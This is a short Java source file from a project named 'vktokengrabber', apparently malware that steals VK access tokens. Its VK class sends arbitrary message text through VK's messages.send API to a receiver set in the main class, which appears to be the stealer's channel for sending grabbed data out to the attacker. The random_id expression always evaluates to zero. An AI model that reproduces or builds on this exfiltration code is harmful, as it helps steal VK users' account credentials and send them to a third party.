package com.github.dedinc.vktokengrabber.utils;

import com.github.dedinc.vktokengrabber.Main;

public class VK {
  public void sendMessage(String message) {
	  Helper.getRequest().get(String.format("https://api.vk.com/method/messages.send?access_token=%s&peer_id=%d&random_id=%d&message=%s&v=5.130", Main.token, Main.receiver, (int) Math.random()*999999999, message.replace("\n", "%0A")));
  }
}
